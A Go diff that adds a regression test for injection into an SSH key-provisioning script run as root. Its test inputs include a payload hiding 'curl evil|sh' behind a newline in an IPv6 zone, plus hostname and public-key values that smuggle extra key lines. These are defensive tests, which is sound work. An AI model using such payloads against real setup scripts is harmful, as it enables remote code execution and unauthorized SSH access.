@@ -398,3 +398,57 @@ type okRunner struct{}
 func (okRunner) Run(context.Context, []byte, string, ...string) (sysexec.Result, error) {
 	return sysexec.Result{}, nil
 }
+
+// The from= list reaches a script run as root (security review N1): an IPv6
+// zone is never accepted (netip takes "fe80::1%<anything>"), every entry is
+// stored canonical, and the key line is checked again where it's made.
+func TestScriptFromInjection(t *testing.T) {
+	_, pub, err := NewKey()
+	if err != nil {
+		t.Fatal(err)
+	}
+	payload := "fe80::1%\"\nKEY\ncurl evil|sh\n\""
+	for _, bad := range [][]string{
+		{payload},
+		{"fe80::1%eth0"},
+		{"fe80::1%eth0/64"},
+		{"100.64.0.5\n"},
+		{"100.64.0.5,1.2.3.4"},
+		{"100.64.0.5\" ssh-ed25519 AAAA"},
+		{"*"},
+		{"!100.64.0.5"},
+		{"host.example.net"},
+	} {
+		if _, err := CanonicalFrom(bad); err == nil {
+			t.Errorf("CanonicalFrom accepted %q", bad)
+		}
+		if _, err := Script(ScriptSetup{Hostname: testHost, PublicKey: pub, From: bad}); err == nil {
+			t.Errorf("Script accepted %q", bad)
+		}
+		if err := (&Settings{ConnectFrom: bad}).Validate(); err == nil {
+			t.Errorf("Settings accepted %q", bad)
+		}
+	}
+	got, err := CanonicalFrom([]string{" 100.64.0.5 ", "203.0.113.7/24", "2001:DB8::1", "::ffff:1.2.3.4"})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if strings.Join(got, ",") != "100.64.0.5,203.0.113.0/24,2001:db8::1,::ffff:1.2.3.4" {
+		t.Fatalf("%q", got)
+	}
+	// Whatever reaches keyLine, it is checked again.
+	for _, s := range []ScriptSetup{
+		{Hostname: testHost, PublicKey: pub, From: []string{payload}},
+		{Hostname: testHost + "\nx", PublicKey: pub},
+		{Hostname: testHost, PublicKey: pub + "\nssh-ed25519 AAAA evil"},
+		{Hostname: testHost, PublicKey: "ssh-rsa AAAA"},
+	} {
+		if line, err := s.keyLine(); err == nil {
+			t.Errorf("keyLine made %q", line)
+		}
+	}
+	s, err := Script(ScriptSetup{Hostname: testHost, PublicKey: pub, From: []string{"2001:db8::1"}})
+	if err != nil || strings.Count(s, "hardyos-standby@"+testHost+"\n") != 1 {
+		t.Fatalf("%v", err)
+	}
+}
